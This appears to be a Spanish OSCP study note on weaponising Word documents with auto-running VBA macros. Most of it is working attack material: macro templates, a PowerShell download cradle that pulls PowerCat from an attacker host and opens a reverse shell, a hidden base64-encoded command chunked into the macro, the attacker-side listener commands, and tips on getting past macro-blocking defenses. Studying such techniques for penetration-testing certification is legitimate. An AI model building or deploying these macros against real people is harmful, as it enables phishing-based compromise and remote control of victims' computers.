---
tipo: tecnica
tags:
  - oscp
  - explotacion
  - client-side
  - windows
  - office
fecha: 2026-09-29
---

# Macros VBA Maliciosas (Office)

> [!abstract]
> Macro **VBA** embebida en un documento de Word que ejecuta código al abrirlo (`AutoOpen`/`Document_Open`). Vector client-side clásico para conseguir **foothold**. Típicamente lanza una **reverse shell** vía download cradle de PowerShell + PowerCat.

## Claves
- VBA da acceso completo a **objetos ActiveX** y al **Windows Script Host** (`Wscript.Shell`).
- Guardar como **`.doc`** o **`.docm`**. Un **`.docx` no guarda macros embebidas** (solo puede ejecutarlas con plantilla adjunta → no persistente).
- En el diálogo de macros elegir el **documento actual** (`Document1`), no la plantilla global (`Normal.dotm`), o la macro no viaja con el fichero.
- Las macros **no corren solas** → `AutoOpen()` **y** `Document_Open()` (cada una cubre casos que la otra no) llaman a la macro real.

## Plantilla
```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"   ' PoC: abre PowerShell
End Sub
```

## Reverse shell (PowerCat)
Comando en claro (download cradle):
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://KALI/powercat.ps1');powercat -c KALI -p 4444 -e powershell
```

Restricciones VBA → hay que **codificar y trocear**:
- Codificar en **base64 UTF-16LE** (`-enc`). Otro charset **no funciona**.
- Strings literales limitados a **255 chars** → partir en trozos y concatenar en una variable (el límite no aplica a variables).

Script Python para trocear:
```python
str = "powershell.exe -nop -w hidden -enc SQBFAFgA..."   # sin saltos de línea
n = 50
for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

Macro final:
```vba
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
    Str = Str + "AdwAtAE8AYgBqAGUAYwB0..."      ' resto de chunks
    CreateObject("Wscript.Shell").Run Str
End Sub
```

| Parte | Qué hace |
|---|---|
| `CreateObject("Wscript.Shell")` | Instancia el WSH Shell (ActiveX) |
| `.Run Str` | Ejecuta el comando del string |
| `-nop` | PowerShell sin perfil |
| `-w hidden` | Ventana oculta |
| `-enc` | Comando base64 (UTF-16LE) |

## Del lado Kali
```bash
python3 -m http.server 80      # dir con powercat.ps1
nc -nvlp 4444                  # listener
```

> [!warning] El aviso de *Enable Content* **solo reaparece si cambia el nombre del documento**. Vectores viejos (**DDE**, **OLE**) ya no funcionan de forma fiable.

> [!tip] Mitigaciones a sortear (ver [[12 - Client-side Attacks]]): **MotW → Protected View** (*Enable Editing*) y **bloqueo de macros por defecto** (*Unblock* en Propiedades).

## Relacionado
- Módulo: [[12 - Client-side Attacks]]
- Alternativa client-side: [[Windows Library Files (.Library-ms)]]
- Cheatsheet: [[Explotacion y Shells]]
